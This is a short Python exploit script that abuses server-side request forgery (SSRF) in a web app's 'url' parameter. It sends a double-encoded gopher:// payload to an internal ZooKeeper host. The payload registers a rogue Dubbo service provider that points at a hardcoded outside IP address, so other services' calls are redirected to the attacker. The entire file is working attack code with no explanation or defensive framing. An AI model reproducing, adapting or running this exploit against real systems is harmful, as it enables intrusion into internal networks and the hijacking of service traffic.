#!/usr/bin/env python

import requests

target = "http://127.0.0.1:8090"
exp_addr = "119.28.49.133"

def exp():
	exp_addr_urlen = ""
	exp_addr_len = hex(len(exp_addr))[2:]
	exp_len = "%2502%25" + hex(27 + 2*len(exp_addr))[2:]
	exp_len_1 = hex(0xec+len(exp_addr))[2:]

	for i in exp_addr:
		exp_addr_urlen = exp_addr_urlen + "%25" + hex(ord(i))[2:]

	print(exp_addr_urlen)

	url = target + "/index.php?url=gopher://10.0.20.11:2181/_%2500%2500%2500%252d%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2575%2530%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2510%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500" + exp_len + "%2500%2500%2500%252e%2500%2500%2500%2501%2500%2500%2501%25" + exp_len_1 + "%252f%2564%2575%2562%2562%256f%252f%2564%2575%2562%2562%256f%252e%2573%2565%2572%2576%2569%2563%2565%252e%2544%2565%256d%256f%2553%2565%2572%2576%2569%2563%2565%252f%2570%2572%256f%2576%2569%2564%2565%2572%2573%252f%2564%2575%2562%2562%256f%2525%2533%2541%2525%2532%2546%2525%2532%2546" + exp_addr_urlen + "%2525%2533%2541%2532%2530%2538%2539%2530%2525%2532%2546%2564%2575%2562%2562%256f%252e%2573%2565%2572%2576%2569%2563%2565%252e%2544%2565%256d%256f%2553%2565%2572%2576%2569%2563%2565%2525%2533%2546%2561%256e%2579%2568%256f%2573%2574%2525%2533%2544%2574%2572%2575%2565%2525%2532%2536%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%2525%2533%2544%2564%2575%2562%2562%256f%252d%2570%2572%256f%2576%2569%2564%2565%2572%2525%2532%2536%2562%2565%2561%256e%252e%256e%2561%256d%2565%2525%2533%2544%2553%2565%2572%2576%2569%2563%2565%2542%2565%2561%256e%2525%2533%2541%2564%2575%2562%2562%256f%252e%2573%2565%2572%2576%2569%2563%2565%252e%2544%2565%256d%256f%2553%2565%2572%2576%2569%2563%2565%2525%2533%2541%2531%252e%2530%252e%2530%2525%2532%2536%2564%2565%2570%2572%2565%2563%2561%2574%2565%2564%2525%2533%2544%2566%2561%256c%2573%2565%2525%2532%2536%2564%2575%2562%2562%256f%2525%2533%2544%2532%252e%2530%252e%2532%2525%2532%2536%2564%2579%256e%2561%256d%2569%2563%2525%2533%2544%2574%2572%2575%2565%2525%2532%2536%2567%2565%256e%2565%2572%2569%2563%2525%2533%2544%2566%2561%256c%2573%2565%2525%2532%2536%2569%256e%2574%2565%2572%2566%2561%2563%2565%2525%2533%2544%2564%2575%2562%2562%256f%252e%2573%2565%2572%2576%2569%2563%2565%252e%2544%2565%256d%256f%2553%2565%2572%2576%2569%2563%2565%2525%2532%2536%256d%2565%2574%2568%256f%2564%2573%2525%2533%2544%2573%2561%2579%2548%2565%256c%256c%256f%2525%2532%2536%2570%2569%2564%2525%2533%2544%2534%2531%2536%2534%2533%2525%2532%2536%2572%2565%2567%2569%2573%2574%2565%2572%2525%2533%2544%2574%2572%2575%2565%2525%2532%2536%2572%2565%256c%2565%2561%2573%2565%2525%2533%2544%2532%252e%2537%252e%2533%2525%2532%2536%2572%2565%2576%2569%2573%2569%256f%256e%2525%2533%2544%2531%252e%2530%252e%2530%2525%2532%2536%2573%2569%2564%2565%2525%2533%2544%2570%2572%256f%2576%2569%2564%2565%2572%2525%2532%2536%2573%2565%2572%2569%2561%256c%2569%257a%2561%2574%2569%256f%256e%2525%2533%2564%256a%2561%2576%2561%2525%2532%2536%2574%2569%256d%2565%2573%2574%2561%256d%2570%2525%2533%2544%2531%2536%2530%2535%2539%2536%2531%2537%2539%2532%2537%2537%2539%2525%2532%2536%2576%2565%2572%2573%2569%256f%256e%2525%2533%2544%2531%252e%2530%252e%2530%2500%2500%2500%250" + exp_addr_len + exp_addr_urlen + "%2500%2500%2500%2501%2500%2500%2500%251f%2500%2500%2500%2505%2577%256f%2572%256c%2564%2500%2500%2500%2506%2561%256e%2579%256f%256e%2565%2500%2500%2500%2500"
	print(url)
	requests.get(url)


if __name__ == '__main__':
	exp()

